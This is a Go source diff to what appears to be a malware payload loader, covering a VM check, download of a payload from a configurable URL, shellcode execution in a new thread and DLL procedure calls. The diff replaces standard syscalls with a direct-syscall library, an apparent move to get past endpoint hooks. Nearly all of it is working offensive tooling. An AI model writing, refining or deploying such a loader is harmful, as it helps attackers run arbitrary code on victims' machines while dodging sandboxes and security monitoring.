@@ -13,28 +13,15 @@ import (
 	"os"
 	"runtime"
 	"strings"
-	"syscall"
 	"time"
+
+	"github.com/carved4/go-direct-syscall"
 )
 
 const (
 	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
 	defaultDownloadURL = ""
 )
-
-
-
-// formatBytesAsHex formats a byte slice as a hex string
-func formatBytesAsHex(data []byte) string {
-	var result strings.Builder
-	for i, b := range data {
-		result.WriteString(fmt.Sprintf("%02X", b))
-		if i < len(data)-1 {
-			result.WriteString(" ")
-		}
-	}
-	return result.String()
-}
 
 func main() {
 	// check if inside vm
@@ -131,23 +118,23 @@ func main() {
 	// For shellcode, execute directly using runshellthread
 	if *isShellcodePtr {
 		fmt.Println("Executing payload as shellcode...")
-		threadHandle, err := runshellthread.ExecuteShellcode(payload, true)
+		threadHandle, err := runshellthread.ExecuteShellcode(payload)
 		if err != nil {
 			fmt.Println("Error executing shellcode:", err)
 			return
 		}
 		fmt.Printf("Shellcode thread created with handle: 0x%x\n", threadHandle)
-		
+
 		// Give the shellcode some time to start executing before prompting
 		fmt.Println("Waiting for shellcode to initialize (5 seconds)...")
 		time.Sleep(5 * time.Second)
-		
+
 		fmt.Println("Shellcode is running. Press Enter to exit...")
-		
+
 		// Keep the main process alive
 		// This allows the shellcode to continue running even if it doesn't signal completion
 		fmt.Scanln() // Wait for user input before exiting
-		
+
 		// Cleanup
 		return
 	}
@@ -175,8 +162,13 @@ func main() {
 				fmt.Printf("Procedure address: 0x%X\n", procAddr)
 				fmt.Println("Calling procedure...")
 
-				// Call the procedure with no arguments
-				_, _, _ = syscall.Syscall(procAddr, 0, 0, 0, 0)
+				// Call the procedure using DirectSyscall for proper calling convention
+				result, err := winapi.DirectSyscall("", procAddr)
+				if err != nil {
+					fmt.Printf("ERROR: DLL procedure call failed: %v\n", err)
+				} else {
+					fmt.Printf("Procedure returned: 0x%X\n", result)
+				}
 
 				fmt.Println("Procedure call completed")
 			}
@@ -189,8 +181,13 @@ func main() {
 				fmt.Printf("Procedure address: 0x%X\n", procAddr)
 				fmt.Println("Calling procedure...")
 
-				// Call the procedure with no arguments
-				_, _, _ = syscall.Syscall(procAddr, 0, 0, 0, 0)
+				// Call the procedure using DirectSyscall for proper calling convention
+				result, err := winapi.DirectSyscall("", procAddr)
+				if err != nil {
+					fmt.Printf("ERROR: DLL procedure call failed: %v\n", err)
+				} else {
+					fmt.Printf("Procedure returned: 0x%X\n", result)
+				}
 
 				fmt.Println("Procedure call completed")
 			}
